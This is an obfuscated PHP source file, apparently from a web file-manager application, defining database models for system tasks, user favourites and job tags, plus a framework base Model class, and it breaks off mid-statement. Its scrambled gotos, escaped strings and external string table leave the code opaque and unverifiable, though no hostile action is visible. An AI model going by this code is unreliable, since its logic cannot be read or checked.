<?php
 goto e±´‰Êè¹Š; BÜ‹ÅœŒ™: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\164\141\x73\x6b\114\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\164\x79\x70\145", "\145\x76\145\156\x74", "\x74\151\x6d\145", "\144\145\163\143", "\163\x79\163\164\x65\155", "\145\156\x61\142\154\145", "\154\x61\x73\164\122\x75\x6e", "\163\157\162\x74"); public function listData($D·¹†Ã¦ = false, $E¸Õƒ‚æŒá = "\x73\x6f\x72\164", $E‚ƒœã…‚ø = false) { return parent::listData($D·¹†Ã¦, $E¸Õƒ‚æŒá, $E‚ƒœã…‚ø); } public function add($AÒ£Ù©Ä×) { $d«Ùøß»¶œ =& $_SERVER[±á õÁ]; $dÖÃ˜àÆØ½ = $this->findByName($AÒ£Ù©Ä×[$d«Ùøß»¶œ[38]]); if ($dÖÃ˜àÆØ½) { return !1; } $AÒ£Ù©Ä×[$d«Ùøß»¶œ[1427]] = 0; $AÒ£Ù©Ä×[$d«Ùøß»¶œ[1644]] = $this->getSort(); return parent::insert($AÒ£Ù©Ä×); } private function getSort() { $F…õè¯æ¥Š =& $_SERVER[±á õÁ]; $eŒó°—Æ‹ã = parent::listData(); $c¯‘Õƒ ‘ = array_to_keyvalue($eŒó°—Æ‹ã, $F…õè¯æ¥Š[43], $F…õè¯æ¥Š[1644]); return empty($c¯‘Õƒ ‘) ? 0 : max($c¯‘Õƒ ‘) + 1; } public function update($F—öß™†ƒ“, $d°¾“òÓ´) { $béì­òŒî  =& $_SERVER[±á õÁ]; $CµÎ÷İ—Š = $this->listData($F—öß™†ƒ“); $cƒÊÓëÅ§ = $this->findByName($d°¾“òÓ´[$béì­òŒî [38]]); if (!$CµÎ÷İ—Š || $cƒÊÓëÅ§ && $cƒÊÓëÅ§[$béì­òŒî [391]] != $CµÎ÷İ—Š[$béì­òŒî [391]]) { return !1; } return parent::update($F—öß™†ƒ“, $d°¾“òÓ´); } public function remove($EÇ‡´ãÎì, $eîÈõŒç = false) { $f÷¦ºËØÒ =& $_SERVER[±á õÁ]; $b‰©Ø÷ôÊ = $this->listData($EÇ‡´ãÎì); if (!$b‰©Ø÷ôÊ) { return; } if (!$eîÈõŒç && $b‰©Ø÷ôÊ[$f÷¦ºËØÒ[1101]] == $f÷¦ºËØÒ[93]) { return !1; } return parent::remove($EÇ‡´ãÎì); } public function enable($BÜ×ƒ‡Œ¯±, $Eéö¿ËŒä‹) { return $this->update($BÜ×ƒ‡Œ¯±, array($_SERVER[±á õÁ][2025] => $Eéö¿ËŒä‹)); } public function run($CÃªÓ¡¨ª—) { return $this->update($CÃªÓ¡¨ª—, array($_SERVER[±á õÁ][2035] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($f¥„ª•ÑÁÛ) { $dêŒë‡Á«Î =& $_SERVER[±á õÁ]; return array($dêŒë‡Á«Î[1719] => array(USER_ID, $dêŒë‡Á«Î[2036])); } protected function listData() { $EÈà¶åšßó =& $_SERVER[±á õÁ]; $E¢Å×ƒÁ¯† = array($EÈà¶åšßó[1455] => USER_ID, $EÈà¶åšßó[459] => 0); $e…ï÷×©¦× = $EÈà¶åšßó[2037]; $dÃ’³èÍ = $this->field($e…ï÷×©¦×)->where($E¢Å×ƒÁ¯†)->order($EÈà¶åšßó[2038])->select(); return $dÃ’³èÍ ? $dÃ’³èÍ : array(); } protected function resetCache() { } protected function listView() { goto F“æåò; aêø¶İºã·: $CóóªÜİ’ = array($cŠÀ­È›‰Ë[407] => array($cŠÀ­È›‰Ë[408], $Dà£×èôòï)); $bÛ…Ã¹¿Ä’ = Model($cŠÀ­È›‰Ë[776])->listSource($CóóªÜİ’, $FÃˆ¡´ƒ÷µ); $bÛ…Ã¹¿Ä’ = array_merge($bÛ…Ã¹¿Ä’[$cŠÀ­È›‰Ë[83]], $bÛ…Ã¹¿Ä’[$cŠÀ­È›‰Ë[84]]); goto fÅÔØßÉğš; F“æåò: $cŠÀ­È›‰Ë =& $_SERVER[±á õÁ]; $Fø¿ÙæËã = $this->listData(); $C…ŞÇİÀÂŒ = array_filter_by_field($Fø¿ÙæËã, $cŠÀ­È›‰Ë[39], $cŠÀ­È›‰Ë[406]); goto aº Ä­ á; aº Ä­ á: $Dà£×èôòï = array_to_keyvalue($C…ŞÇİÀÂŒ, $cŠÀ­È›‰Ë[43], $cŠÀ­È›‰Ë[85]); if (!$Dà£×èôòï) { return $Fø¿ÙæËã; } $FÃˆ¡´ƒ÷µ = 2000; goto aêø¶İºã·; fÅÔØßÉğš: $bÛ…Ã¹¿Ä’ = array_to_keyvalue($bÛ…Ã¹¿Ä’, $cŠÀ­È›‰Ë[393]); foreach ($Fø¿ÙæËã as $bî¾°¶É‡§ => $cÈÄœ±“Ñ) { $c™ ö¨§â = $bÛ…Ã¹¿Ä’[$cÈÄœ±“Ñ[$cŠÀ­È›‰Ë[85]]]; $c™ ö¨§â = $c™ ö¨§â ? $c™ ö¨§â : array(); $Fø¿ÙæËã[$bî¾°¶É‡§] = array_merge($c™ ö¨§â, $cÈÄœ±“Ñ); } return $Fø¿ÙæËã; goto E®·õÊ„; E®·õÊ„: } protected function addFav($cÁ¼í„óÍ, $Då½Ê‰Ë ½ = '', $aã·ÏÒ‘¾ó = "\x73\x6f\x75\162\x63\145") { goto e·Ãµ…¼š•; e·Ãµ…¼š•: $dÛ¾äáÃ­Ğ =& $_SERVER[±á õÁ]; $B¾ÛÉğŒ« = array($dÛ¾äáÃ­Ğ[1455] => USER_ID, $dÛ¾äáÃ­Ğ[459] => 0, $dÛ¾äáÃ­Ğ[412] => $aã·ÏÒ‘¾ó, $dÛ¾äáÃ­Ğ[411] => $cÁ¼í„óÍ); if ($this->where($B¾ÛÉğŒ«)->find()) { return !1; } goto AÒ›éÙ²†‰; AÒ›éÙ²†‰: $B¾ÛÉğŒ« = array($dÛ¾äáÃ­Ğ[1455] => USER_ID, $dÛ¾äáÃ­Ğ[459] => 0); $cÇº–¡¡²Ô = $this->where($B¾ÛÉğŒ«)->max($dÛ¾äáÃ­Ğ[1644]); if (!$cÇº–¡¡²Ô) { $cÇº–¡¡²Ô = 0; } goto D­®÷¾Á‘×; CÖÈ´‰³•: return $this->add($fŸ†…¾š·÷); goto c¸¥ô±ãìÖ; D­®÷¾Á‘×: if (!$Då½Ê‰Ë ½ && $aã·ÏÒ‘¾ó == $dÛ¾äáÃ­Ğ[406]) { $bËÇšêƒñæ = Model($dÛ¾äáÃ­Ğ[1138])->where(array($dÛ¾äáÃ­Ğ[407] => $cÁ¼í„óÍ))->find(); if (!$bËÇšêƒñæ) { return !1; } $Då½Ê‰Ë ½ = $bËÇšêƒñæ[$dÛ¾äáÃ­Ğ[38]]; } $Då½Ê‰Ë ½ = $this->getAutoName($Då½Ê‰Ë ½); $fŸ†…¾š·÷ = array($dÛ¾äáÃ­Ğ[1455] => USER_ID, $dÛ¾äáÃ­Ğ[459] => 0, $dÛ¾äáÃ­Ğ[410] => $Då½Ê‰Ë ½, $dÛ¾äáÃ­Ğ[411] => $cÁ¼í„óÍ, $dÛ¾äáÃ­Ğ[412] => $aã·ÏÒ‘¾ó, $dÛ¾äáÃ­Ğ[1625] => $cÇº–¡¡²Ô + 1); goto CÖÈ´‰³•; c¸¥ô±ãìÖ: } protected function remove($eÁ· ¤éÓç) { $C°ƒÃÉ‰¥© =& $_SERVER[±á õÁ]; $e÷šÈÉ×±ƒ = array($C°ƒÃÉ‰¥©[1455] => USER_ID, $C°ƒÃÉ‰¥©[409] => $eÁ· ¤éÓç); return $this->where($e÷šÈÉ×±ƒ)->delete(); } protected function removeByName($Cø‡—©ÄØ) { $E«âõˆï‚Ó =& $_SERVER[±á õÁ]; $BçÈœ¥ò®´ = array($E«âõˆï‚Ó[1455] => USER_ID, $E«âõˆï‚Ó[410] => $Cø‡—©ÄØ, $E«âõˆï‚Ó[459] => 0); return $this->where($BçÈœ¥ò®´)->delete(); } protected function rename($Cñù†‡ÇÎ, $B˜£ÕëÛ´) { $Aâà¬ÌœŠÌ =& $_SERVER[±á õÁ]; if ($Cñù†‡ÇÎ == $B˜£ÕëÛ´) { return !1; } $Añâ¶ŒáÅ– = $this->getAutoName($B˜£ÕëÛ´); if ($B˜£ÕëÛ´ != $Añâ¶ŒáÅ–) { return !1; } $e±§á÷„÷— = array($Aâà¬ÌœŠÌ[1455] => USER_ID, $Aâà¬ÌœŠÌ[459] => 0, $Aâà¬ÌœŠÌ[38] => $Cñù†‡ÇÎ); return $this->where($e±§á÷„÷—)->save(array($Aâà¬ÌœŠÌ[38] => $B˜£ÕëÛ´)); } protected function resetSort($F¡îé·ù½à) { $CøÍÉ˜âøÀ =& $_SERVER[±á õÁ]; $F¡îé·ù½à = is_array($F¡îé·ù½à) ? $F¡îé·ù½à : array(); $FÚÆ”Øˆ“ã = array($CøÍÉ˜âøÀ[1455] => USER_ID); for ($c¯§ôºÃˆ = 0; $c¯§ôºÃˆ < count($F¡îé·ù½à); $c¯§ôºÃˆ++) { $FÚÆ”Øˆ“ã[$CøÍÉ˜âøÀ[409]] = $F¡îé·ù½à[$c¯§ôºÃˆ]; $this->where($FÚÆ”Øˆ“ã)->save(array($CøÍÉ˜âøÀ[1625] => $c¯§ôºÃˆ + 1)); } return !0; } protected function moveTop($côÖÑ½¡«) { goto fíô–íâ¦á; F¶…ôËÙÎ: $c‚Ú¦©Ú = $Dã¤ø·¤¥‘; $Dã¤ø·¤¥‘ = array_remove_value($Dã¤ø·¤¥‘, $fÑÏ»Î‡®[$FìæÂŒèŞ‡[391]]); array_unshift($Dã¤ø·¤¥‘, $fÑÏ»Î‡®[$FìæÂŒèŞ‡[391]]); goto AïÒŞóæ¥; fíô–íâ¦á: $FìæÂŒèŞ‡ =& $_SERVER[±á õÁ]; $BàõŒ Š = array($FìæÂŒèŞ‡[1455] => USER_ID, $FìæÂŒèŞ‡[459] => 0); $fÑÏ»Î‡® = $this->where($BàõŒ Š)->where(array($FìæÂŒèŞ‡[38] => $côÖÑ½¡«))->find(); goto EƒãŒ–ñ; AïÒŞóæ¥: return $this->resetSort($Dã¤ø·¤¥‘); goto ašÔ´• ; EƒãŒ–ñ: if (!$fÑÏ»Î‡®) { return; } $Dã¤ø·¤¥‘ = $this->field($FìæÂŒèŞ‡[391])->where($BàõŒ Š)->order($FìæÂŒèŞ‡[2038])->select(); $Dã¤ø·¤¥‘ = array_to_keyvalue($Dã¤ø·¤¥‘, $FìæÂŒèŞ‡[43], $FìæÂŒèŞ‡[391]); goto F¶…ôËÙÎ; ašÔ´• : } protected function moveBottom($CßÃà°´öß) { $dî­Ö“·Ì› =& $_SERVER[±á õÁ]; $dí‚…øùœ = array($dî­Ö“·Ì›[1455] => USER_ID, $dî­Ö“·Ì›[459] => 0); $e’´öÓá‚ã = $this->where($dí‚…øùœ)->max($dî­Ö“·Ì›[1644]); $dÈŒ®ˆÛº = array($dî­Ö“·Ì›[1644] => $e’´öÓá‚ã + 1); return $this->where($dí‚…øùœ)->where(array($dî­Ö“·Ì›[38] => $CßÃà°´öß))->save($dÈŒ®ˆÛº); } private function getAutoName($B¼²´š«‚—) { goto Bïßè¶¸²º; Bïßè¶¸²º: $c‘Ğ‹¯°ºå =& $_SERVER[±á õÁ]; $aÂ­•ÑÇã = array($c‘Ğ‹¯°ºå[1455] => USER_ID, $c‘Ğ‹¯°ºå[459] => 0); $bÍÏŠÒì…Ş = $this->field($c‘Ğ‹¯°ºå[38])->where($aÂ­•ÑÇã)->select(); goto Eë²ğ¶‚ˆÕ; D‚Ê Ë°Ù§: return $B¼²´š«‚— . "\x28{$fèÛñ ›»«}\51"; goto cÍïÓŸ’ÂÂ; Eë²ğ¶‚ˆÕ: $bÍÏŠÒì…Ş = array_to_keyvalue($bÍÏŠÒì…Ş, $c‘Ğ‹¯°ºå[43], $c‘Ğ‹¯°ºå[38]); if (!$bÍÏŠÒì…Ş || !in_array($B¼²´š«‚—, $bÍÏŠÒì…Ş)) { return $B¼²´š«‚—; } for ($fèÛñ ›»« = 0; $fèÛñ ›»« < count($bÍÏŠÒì…Ş); $fèÛñ ›»«++) { if (!in_array($B¼²´š«‚— . "\50{$fèÛñ ›»«}\x29", $bÍÏŠÒì…Ş)) { return $B¼²´š«‚— . "\x28{$fèÛñ ›»«}\x29"; } } goto D‚Ê Ë°Ù§; cÍïÓŸ’ÂÂ: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\x6a\x6f\x62\x4c\151\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x64\x65\163\143", "\163\x6f\x72\x74"); const JOB_KEY = "\x73\145\154\x66\x4a\x6f\x62\x4c\x69\x73\x74"; public function listData($CÚä¦ôØÀ = false, $Bé•óÏğÕ = "\x73\x6f\x72\x74", $c§…òâ÷˜œ = false) { return parent::listData($CÚä¦ôØÀ, $Bé•óÏğÕ, $c§…òâ÷˜œ); } public function remove($a›ƒÌ¦Œé) { return parent::remove($a›ƒÌ¦Œé); } public function add($cæŠÙƒ¿Š») { $DÊ÷¾­Š«Š =& $_SERVER[±á õÁ]; if ($this->findByName($cæŠÙƒ¿Š»[$DÊ÷¾­Š«Š[38]])) { return !1; } $cæŠÙƒ¿Š»[$DÊ÷¾­Š«Š[1644]] = $this->getSort(); return parent::insert($cæŠÙƒ¿Š»); } private function getSort() { $fêŠ´àß‘ =& $_SERVER[±á õÁ]; $CÇééÃÀñ = parent::listData(); $fÛ÷½’†Ô¯ = array_to_keyvalue($CÇééÃÀñ, $fêŠ´àß‘[43], $fêŠ´àß‘[1644]); return empty($fÛ÷½’†Ô¯) ? 0 : max($fÛ÷½’†Ô¯) + 1; } public function update($B³¯¤‰ùÃ, $fÊ«ÇÇÁ”) { $Cµğìˆ’ªˆ =& $_SERVER[±á õÁ]; $DÒä–¶Ö†‘ = parent::listData($B³¯¤‰ùÃ); $b°Ø¾Š×ƒ = $this->findByName($fÊ«ÇÇÁ”[$Cµğìˆ’ªˆ[38]]); if (!$DÒä–¶Ö†‘ || $b°Ø¾Š×ƒ && $b°Ø¾Š×ƒ[$Cµğìˆ’ªˆ[391]] != $DÒä–¶Ö†‘[$Cµğìˆ’ªˆ[391]]) { return !1; } return parent::update($B³¯¤‰ùÃ, $fÊ«ÇÇÁ”); } public function setUserJob($Eİ¹¢µ¢â¿, $AÍê¯òŠó) { goto F¦šÛªŞéì; CìóÜ¸Å‹Ğ: $Eâ„áªç›â = rtrim($Eâ„áªç›â, $Fãˆ…Í¨¶’[57]); Model($Fãˆ…Í¨¶’[502])->metaSet($Eİ¹¢µ¢â¿, self::JOB_KEY, $Eâ„áªç›â); goto aÛ¦ÖÔ¸×ç; cÛ¾’ˆ¯“: $CñğŒ£¥±º = array_to_keyvalue($f¶Ê¿Ò¾–â, $Fãˆ…Í¨¶’[38]); $Eâ„áªç›â = $Fãˆ…Í¨¶’[18]; foreach ($AÍê¯òŠó as $eĞ†ß’ºò˜) { if ($CñğŒ£¥±º[$eĞ†ß’ºò˜]) { $Eâ„áªç›â .= $CñğŒ£¥±º[$eĞ†ß’ºò˜][$Fãˆ…Í¨¶’[391]] . $Fãˆ…Í¨¶’[57]; } else { $CÁ•¢‰‚ã‰ = $this->add($eĞ†ß’ºò˜); $Eâ„áªç›â .= $CÁ•¢‰‚ã‰ . $Fãˆ…Í¨¶’[57]; } } goto CìóÜ¸Å‹Ğ; F¦šÛªŞéì: $Fãˆ…Í¨¶’ =& $_SERVER[±á õÁ]; if (!is_array($AÍê¯òŠó)) { $AÍê¯òŠó = array($AÍê¯òŠó); } $f¶Ê¿Ò¾–â = parent::listData(); goto cÛ¾’ˆ¯“; aÛ¦ÖÔ¸×ç: } public function getUserJob($dÔì„¼–Ñ•) { $D”á±Ä„‹Ñ = Model($_SERVER[±á õÁ][502])->metaGet($dÔì„¼–Ñ•); return $this->getUserJobInfo($D”á±Ä„‹Ñ[self::JOB_KEY]); } public function getUserJobInfo($BšĞ´í×Ï) { goto a©äõ‹¤òĞ; a©äõ‹¤òĞ: $FÌèà­í“¹ =& $_SERVER[±á õÁ]; $d²¹Á°†èË = explode($FÌèà­í“¹[57], $BšĞ´í×Ï); $eÂßõ¢Ù‰Æ = parent::listData(); goto CÏŒ°‘‰‡º; CÏŒ°‘‰‡º: $eÂßõ¢Ù‰Æ = array_remove_key($eÂßõ¢Ù‰Æ, $FÌèà­í“¹[200]); $A­Õ„°é´› = array(); foreach ($d²¹Á°†èË as $c‹Ü„‚Œà¸) { if (isset($eÂßõ¢Ù‰Æ[$c‹Ü„‚Œà¸])) { $A­Õ„°é´›[] = $eÂßõ¢Ù‰Æ[$c‹Ü„‚Œà¸]; } } goto CÄ¦«àÜˆ; CÄ¦«àÜˆ: return $A­Õ„°é´›; goto b…‘Õ‚ÄÎ‡; b…‘Õ‚ÄÎ‡: } } goto fˆ…†¡ñ£; aÉ±ŒÜ‚†: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\145", "\157\162\x64\x65\x72", "\x61\x6c\x69\141\x73", "\150\x61\x76\x69\x6e\x67", "\x67\162\x6f\165\160", "\x6c\x6f\143\x6b", "\x64\151\163\164\151\156\x63\x74", "\x61\x75\164\x6f", "\146\151\154\164\145\162", "\x76\141\154\151\x64\x61\164\x65", "\162\x65\x73\165\x6c\164", "\142\151\x6e\x64", "\x74\157\x6b\x65\x6e"); public function __construct($eÚ÷½è® = '', $AŒ»É£½Ö¹ = '', $F¥…·ŠÏ­ = '') { $b­ÁÜğÁªÅ =& $_SERVER[±á õÁ]; $this->_initialize(); if (!empty($eÚ÷½è®)) { if (strpos($eÚ÷½è®, $b­ÁÜğÁªÅ[101])) { list($this->dbName, $this->name) = explode($b­ÁÜğÁªÅ[101], $eÚ÷½è®); } else { $this->name = $eÚ÷½è®; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($AŒ»É£½Ö¹)) { $this->tablePrefix = $b­ÁÜğÁªÅ[43]; } elseif ($b­ÁÜğÁªÅ[43] != $AŒ»É£½Ö¹) { $this->tablePrefix = $AŒ»É£½Ö¹; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($b­ÁÜğÁªÅ[247]); } $this->db(0, empty($this->connection) ? $F¥…·ŠÏ­ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $bïòØŞ‰ôª =& $_SERVER[±á õÁ]; if (empty($this->fields)) { if (think_config($bïòØŞ‰ôª[248])) { $Aï•÷µõ²Õ = $this->dbName ? $this->dbName : think_config($bïòØŞ‰ôª[249]); $B«È—¡º½ = think_var_cache($bïòØŞ‰ôª[250] . strtolower(get_path_this($Aï•÷µõ²Õ) . $bïòØŞ‰ôª[101] . $this->name)); if ($B«È—¡º½) { $d£ÚºóËèÂ = think_config($bïòØŞ‰ôª[251]); if (empty($d£ÚºóËèÂ) || $B«È—¡º½[$bïòØŞ‰ôª[252]] == $d£ÚºóËèÂ) { $this->fields = $B«È—¡º½; return; } } } $this->flush(); } } public function flush() { goto C„ñ¼×îÅ¯; Dë”¸±­ñ°: foreach ($Bâ™¯¯Ÿ˜‚ as $fÆ…§ŒïÏÊ => $Bğñ‰Ã”ğ•) { $Aƒâï›æ¥È[$fÆ…§ŒïÏÊ] = $Bğñ‰Ã”ğ•[$AØ˜³õ¿‚[39]]; if ($Bğñ‰Ã”ğ•[$AØ˜³õ¿‚[46]]) { $this->fields[$AØ˜³õ¿‚[254]] = $fÆ…§ŒïÏÊ; if ($Bğñ‰Ã”ğ•[$AØ˜³õ¿‚[49]]) { $this->fields[$AØ˜³õ¿‚[253]] = !0; } } } $this->fields[$AØ˜³õ¿‚[255]] = $Aƒâï›æ¥È; if (think_config($AØ˜³õ¿‚[251])) { $this->fields[$AØ˜³õ¿‚[252]] = think_config($AØ˜³õ¿‚[251]); } goto Fâç‰•³‘®; C„ñ¼×îÅ¯: $AØ˜³õ¿‚ =& $_SERVER[±á õÁ]; $this->db->setModel($this->name); $Bâ™¯¯Ÿ˜‚ = $this->db->getFields($this->getTableName()); goto f·´´Îà“‚; Fâç‰•³‘®: if (think_config($AØ˜³õ¿‚[248])) { $e¦àî‹¡İ = $this->dbName ? $this->dbName : think_config($AØ˜³õ¿‚[249]); think_var_cache($AØ˜³õ¿‚[250] . strtolower(get_path_this($e¦àî‹¡İ) . $AØ˜³õ¿‚[101] . $this->name), $this->fields); } goto C´–Ò´ÑÉì; f·´´Îà“‚: if (!$Bâ™¯¯Ÿ˜‚) { return !1; } $this->fields = array_keys($Bâ™¯¯Ÿ˜‚); $this->fields[$AØ˜³õ¿‚[253]] = !1; goto Dë”¸±­ñ°; C´–Ò´ÑÉì: } public function switchModel($aÄ•ãõø, $B¿Œí‚—ˆ¸ = array()) { $cà÷¦¸æ²Ñ =& $_SERVER[±á õÁ]; $f˜ÕÚöÔì– = ucwords(strtolower($aÄ•ãõø)) . $cà÷¦¸æ²Ñ[256]; if (!class_exists($f˜ÕÚöÔì–)) { think_exception($f˜ÕÚöÔì– . think_lang($cà÷¦¸æ²Ñ[257])); } $this->_extModel = new $f˜ÕÚöÔì–($this->name); if (!empty($B¿Œí‚—ˆ¸)) { foreach ($B¿Œí‚—ˆ¸ as $eê—£åãâµ) { $this->_extModel->setProperty($eê—£åãâµ, $this->{$eê—£åãâµ}); } } return $this->_extModel; } public function __set($b‰—³÷ÃÕÌ, $dœ©Ëé…ƒù) { $this->data[$b‰—³÷ÃÕÌ] = $dœ©Ëé…ƒù; } public function __get($BŠİœèÁ–˜) { return isset($this->data[$BŠİœèÁ–˜]) ? $this->data[$BŠİœèÁ–˜] : null; } public function __isset($B†Áæ“Ú²) { return isset($this->data[$B†Áæ“Ú²]); } public function __unset($B³ñ§Öà±) { unset($this->data[$B³ñ§Öà±]); } public function __call($FÍâ°’šÕ, $CÊØãÅé“Ü) { $BàÉÖÖï™ =& $_SERVER[±á õÁ]; if (in_array(strtolower($FÍâ°’šÕ), $this->methods, !0)) { $this->options[strtolower($FÍâ°’šÕ)] = $CÊØãÅé“Ü[0]; return $this; } elseif (in_array(strtolower($FÍâ°’šÕ), array($BàÉÖÖï™[258], $BàÉÖÖï™[259], $BàÉÖÖï™[260], $BàÉÖÖï™[261], $BàÉÖÖï™[262]), !0)) { $fé“íÛ—¶ = isset($CÊØãÅé“Ü[0]) ? $CÊØãÅé“Ü[0] : $BàÉÖÖï™[190]; $fé“íÛ—¶ = $this->db->parseKey($fé“íÛ—¶); return $this->getField(strtoupper($FÍâ°’šÕ) . $BàÉÖÖï™[263] . $fé“íÛ—¶ . $BàÉÖÖï™[264] . $FÍâ°’šÕ, $BàÉÖÖï™[258]); } elseif (strtolower(substr($FÍâ°’šÕ, 0, 5)) == $BàÉÖÖï™[265]) { $fé“íÛ—¶ = think_parse_name(substr($FÍâ°’šÕ, 5)); $Bï–¢ëØ[$fé“íÛ—¶] = $CÊØãÅé“Ü[0]; return $this->where($Bï–¢ëØ)->find(); } elseif (strtolower(substr($FÍâ°’šÕ, 0, 10)) == $BàÉÖÖï™[266]) { $AÃóÛ²Û•º = think_parse_name(substr($FÍâ°’šÕ, 10)); $Bï–¢ëØ[$AÃóÛ²Û•º] = $CÊØãÅé“Ü[0]; return $this->where($Bï–¢ëØ)->getField($CÊØãÅé“Ü[1]); } elseif (isset($this->_scope[$FÍâ°’šÕ])) { return $this->scope($FÍâ°’šÕ, $CÊØãÅé“Ü[0]); } elseif (method_exists($this, $FÍâ°’šÕ)) { array_unshift($CÊØãÅé“Ü, $FÍâ°’šÕ); return call_user_func_array(array($this, $BàÉÖÖï™[267]), $CÊØãÅé“Ü); } else { return call_user_func_array(array(parent, $FÍâ°’šÕ), $CÊØãÅé“Ü); } } protected function call() { goto a§É¬ÌÃŒñ; a•™´•ÏØö: $AÛÏ‰ï¦¥² = $b¶‰Œ³‘¿; if (is_array($b¶‰Œ³‘¿)) { $AÛÏ‰ï¦¥² = $b¶‰Œ³‘¿[1]; $b¶‰Œ³‘¿ = $b¶‰Œ³‘¿[0]; } $FĞòˆî†İ… = count($bîÊÕ­Ê¹á) - 1; goto FŠâŠ¢½´; a§É¬ÌÃŒñ: $dÛÓ‰¸¶¾Ì =& $_SERVER[±á õÁ]; $bîÊÕ­Ê¹á = func_get_args(); $b¶‰Œ³‘¿ = array_shift($bîÊÕ­Ê¹á); goto a•™´•ÏØö; FŠâŠ¢½´: if (isset($bîÊÕ­Ê¹á[$FĞòˆî†İ…]) && $bîÊÕ­Ê¹á[$FĞòˆî†İ…] === $b¶‰Œ³‘¿) { think_exception(__CLASS__ . $dÛÓ‰¸¶¾Ì[4] . $b¶‰Œ³‘¿ . think_lang($dÛÓ‰¸¶¾Ì[268])); return; } $bîÊÕ­Ê¹á[] = $b¶‰Œ³‘¿; if (method_exists($this, $dÛÓ‰¸¶¾Ì[269])) { $D†¡Ï†ù‘ = call_user_func_array(array($this, $dÛÓ‰¸¶¾Ì[270]), array($AÛÏ‰ï¦¥², $bîÊÕ­Ê¹á)); if (!is_null($D†¡Ï†ù‘) && $D†¡Ï†ù‘ !== !1) { return $D†¡Ï†ù‘; } } goto cÏƒˆ¤…´; cÏƒˆ¤…´: $Cï¥İŒ›ªù = call_user_func_array(array($this, $b¶‰Œ³‘¿), $bîÊÕ­Ê¹á); if (method_exists($this, $dÛÓ‰¸¶¾Ì[271])) { $D†¡Ï†ù‘ = call_user_func_array(array($this, $dÛÓ‰¸¶¾Ì[272]), array($AÛÏ‰ï¦¥², $bîÊÕ­Ê¹á, $Cï¥İŒ›ªù)); if ($D†¡Ï†ù‘) { return $D†¡Ï†ù‘; } } return $Cï¥İŒ›ªù; goto Dó™§ÅÔ‚ë; Dó™§ÅÔ‚ë: } protected function _initialize() { } protected function _facade($b­”àë‹•´) { $dÔËì°¼ÊÛ =& $_SERVER[±á õÁ]; if (!empty($this->fields)) { foreach ($b­”àë‹•´ as $B«ÔÓÇŒĞ« => $eÆ¤ÚÄ‡£‡) { if (!in_array($B«ÔÓÇŒĞ«, $this->fields, !0)) { unset($b­”àë‹•´[$B«ÔÓÇŒĞ«]); } elseif (is_scalar($eÆ¤ÚÄ‡£‡)) { $this->_parseType($b­”àë‹•´, $B«ÔÓÇŒĞ«); } } } if (!empty($this->options[$dÔËì°¼ÊÛ[273]])) { $b­”àë‹•´ = array_map($this->options[$dÔËì°¼ÊÛ[273]], $b­”àë‹•´); unset($this->options[$dÔËì°¼ÊÛ[273]]); } $this->_beforeWrite($b­”àë‹•´); return $b­”àë‹•´; } protected function _beforeWrite(&$cåòŒ›ğ¬) { } public function add($bèñå­Á•‹ = '', $F„Œ¶–‘Úâ = array(), $f¿™“Ì’Âã = false) { goto bñ¢óßµøÅ; d§Æ¹¦‡Îš: return $cŒ¨°—–°›; goto BääôÃ†‹; eÓÕœº‹ê: if (!1 === $this->_beforeInsert($bèñå­Á•‹, $F„Œ¶–‘Úâ)) { return !1; } $cŒ¨°—–°› = $this->db->insert($bèñå­Á•‹, $F„Œ¶–‘Úâ, $f¿™“Ì’Âã); if (!1 !== $cŒ¨°—–°›) { $a¶°ªÏÊÃî = $this->getLastInsID(); if ($a¶°ªÏÊÃî) { $bèñå­Á•‹[$this->getPk()] = $a¶°ªÏÊÃî; $this->_after_insert($bèñå­Á•‹, $F„Œ¶–‘Úâ); return $a¶°ªÏÊÃî; } $this->_after_insert($bèñå­Á•‹, $F„Œ¶–‘Úâ); } goto d§Æ¹¦‡Îš; bñ¢óßµøÅ: if (empty($bèñå­Á•‹)) { if (!empty($this->data)) { $bèñå­Á•‹ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[±á õÁ][274]); return !1; } } $F„Œ¶–‘Úâ = $this->_parseOptions($F„Œ¶–‘Úâ); $bèñå­Á•‹ = $this->_facade($bèñå­Á•‹); goto eÓÕœº‹ê; BääôÃ†‹: } protected function _beforeInsert(&$AÃåªÉÄ×Å, $dŞ¡ÔŒ™Úñ) { } protected function _after_insert($E¼¦ôœĞ˜Œ, $EÑµĞ¯¹°Ÿ) { } public function addAll($F’Çë¤æïŒ, $dŠÉó“¯ìÆ = array(), $BğÚÒíŠì¼ = false) { goto C’…’Ø·éµ; cÀµ³çÏ¹: return $e…“ÖèªÆ…; goto A‹ç‰¡Ûƒ; b²ôÃ¬í“ƒ: foreach ($F’Çë¤æïŒ as $f‘À¶Å¼‰ => $Cß’ªŞŞŒ¦) { $F’Çë¤æïŒ[$f‘À¶Å¼‰] = $this->_facade($Cß’ªŞŞŒ¦); } if (method_exists($this->db, $C¢Â©ñÊé[275])) { $e…“ÖèªÆ… = $this->db->insertAll($F’Çë¤æïŒ, $dŠÉó“¯ìÆ, $BğÚÒíŠì¼); } else { $this->startTrans(); foreach ($F’Çë¤æïŒ as $f‘À¶Å¼‰ => $Cß’ªŞŞŒ¦) { $e…“ÖèªÆ… = $this->db->insert($Cß’ªŞŞŒ¦, $dŠÉó“¯ìÆ, $BğÚÒíŠì¼); } $this->commit(); } if (!1 !== $e…“ÖèªÆ…) { $E——¸Ùöèë = $this->getLastInsID(); if ($E——¸Ùöèë) { return $E——¸Ùöèë; } } goto cÀµ³çÏ¹; C’…’Ø·éµ: $C¢Â©ñÊé =& $_SERVER[±á õÁ]; if 